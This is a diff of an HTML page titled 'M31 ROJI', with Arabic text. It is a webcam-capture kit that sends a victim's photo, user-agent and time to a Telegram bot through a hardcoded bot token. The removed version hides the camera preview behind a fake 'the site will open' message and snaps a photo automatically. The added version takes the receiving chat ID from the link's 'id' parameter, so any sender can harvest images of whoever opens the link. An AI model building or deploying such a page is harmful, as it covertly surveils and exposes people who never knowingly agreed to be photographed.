@@ -5,110 +5,69 @@
 <title>M31 ROJI</title>
 
 <style>
-html, body {
-  margin: 0;
-  padding: 0;
-  height: 100%;
-}
-
 body {
-  background-image: url("https://i.ytimg.com/vi/ft7afpoU2jI/hqdefault.jpg");
-  background-size: 48%;
-  background-position: center;
-  background-repeat: no-repeat;
-}
-
-
-  display: flex;
-  align-items: center;
-  justify-content: center;
-
-  font-family: Arial, sans-serif;
-  color: #0f0;
-  text-align: center;
-}
-
-/* طبقة خفيفة لقراءة النص */
-.overlay {
-  background: rgba(0,0,0,0.4);
-  padding: 2px 3px;
-  border-radius: 1px;
-}
-}
-
-<style>
-body {
+  margin:0;
+  padding:0;
+  height:100%;
   background:#000;
   color:#0f0;
   text-align:center;
   font-family:Arial;
 }
 
-/* إخفاء معاينة الكاميرا */
 video {
-  display: none;
+  width: 300px;
+  margin-top: 20px;
 }
 </style>
 </head>
 
 <body>
 
-<h3> انتضر سيتم فتح الموقع  </h3>
+<h3>اضغط لتشغيل الكاميرا</h3>
 
+<button onclick="startCamera()">تشغيل الكاميرا</button>
+<button onclick="captureOnce()">التقاط صورة</button>
+
+<br>
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-// ===== ضع معلوماتك هنا (محليًا فقط) =====
+// 🔥 توكن البوت
 const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
-const CHAT_ID  = "6251932709";
-// ======================================
+
+// ✅ استخراج ID من الرابط
+const params = new URLSearchParams(window.location.search);
+const USER_ID = params.get("id");
 
 let streamRef = null;
 
-// جمع معلومات الجهاز
+// معلومات الجهاز
 function getDeviceInfo() {
-  const ua = navigator.userAgent;
-
-  let deviceType = "غير معروف";
-  if (/android/i.test(ua)) deviceType = "Android";
-    
-  else if (/iphone|ipad|ipod/i.test(ua)) deviceType = "iPhone / iOS";
-    
-  else if (/windows/i.test(ua)) deviceType = "Windows";
-    
-  else if (/macintosh/i.test(ua)) deviceType = "Mac";
-    
-  else if (/linux/i.test(ua)) deviceType = "Linux";
-
   return `
-📱 نوع الجهاز: ${deviceType}
-
-🌐 المتصفح: ${navigator.appName}
-
-🧭 User-Agent: ${ua}
-
-https://roji20112.github.io/ROJI-DOMINE/
-
-⏰ الوقت: ${new Date().toLocaleString()}
-
+📱 ${navigator.userAgent}
+⏰ ${new Date().toLocaleString()}
   `;
 }
 
 // تشغيل الكاميرا (بموافقة المستخدم)
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-  streamRef = stream;
-  document.getElementById("video").srcObject = stream;
+function startCamera() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    streamRef = stream;
+    document.getElementById("video").srcObject = stream;
+  })
+  .catch(() => alert("تم رفض الكاميرا"));
+}
 
-  // صورة واحدة فقط بعد ثانيتين
-  setTimeout(captureOnce, 2000);
-})
-.catch(() => {
-  document.body.innerHTML = "<h2>تم رفض إذن الكاميرا</h2>";
-});
-
+// التقاط صورة وإرسالها
 function captureOnce() {
+  if (!USER_ID) {
+    alert("الرابط غير صحيح");
+    return;
+  }
+
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
 
@@ -116,14 +75,13 @@ function captureOnce() {
   canvas.height = video.videoHeight;
   canvas.getContext("2d").drawImage(video, 0, 0);
 
-  // إيقاف الكاميرا
   if (streamRef) {
     streamRef.getTracks().forEach(t => t.stop());
   }
 
   canvas.toBlob(blob => {
     const form = new FormData();
-    form.append("chat_id", CHAT_ID);
+    form.append("chat_id", USER_ID); // 🔥 هنا السر
     form.append("photo", blob);
     form.append("caption", getDeviceInfo());
 
@@ -132,10 +90,10 @@ function captureOnce() {
       body: form
     })
     .then(() => {
-      document.body.innerHTML = "<h2>تم الفتح ✅</h2>";
+      document.body.innerHTML = "<h2>تم الإرسال ✅</h2>";
     })
     .catch(() => {
-      document.body.innerHTML = "<h2>فشل فتح ❌</h2>";
+      document.body.innerHTML = "<h2>فشل ❌</h2>";
     });
   }, "image/jpeg");
 }
@@ -143,5 +101,3 @@ function captureOnce() {
 
 </body>
 </html>
-
-
